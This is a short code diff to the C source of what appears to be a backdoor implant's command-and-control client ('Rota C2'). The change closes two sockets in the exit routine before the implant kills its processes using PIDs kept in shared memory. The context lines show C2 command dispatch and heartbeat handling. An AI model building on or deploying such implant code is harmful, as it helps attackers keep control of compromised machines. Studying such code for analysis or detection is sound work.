@@ -117,7 +117,7 @@ void c2_loop() {
             #ifdef DEBUG
             printf("[+] Rota C2 Run exiting!");
             #endif
-            c2_exit(sock);
+            c2_exit(sock, sock2);
         }
         else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
             c2_heartbeat(cmd_id, sock);
@@ -275,7 +275,7 @@ void c2_loop() {
 }
 
 
-void c2_exit(int sock) {
+void c2_exit(int sock, int sock2) {
 
     char *msg = "exiting!";
     int msgLen = strlen(msg);
@@ -308,6 +308,9 @@ void c2_exit(int sock) {
 
     // get pids from sharedmem and kill both pids
     int shmid = shmget(0x64b2e2, 8, 0666);
+
+		close(sock);
+		close(sock2);
 
     // if handled on sharedmem cannot be obtained
     if (shmid == -1) {
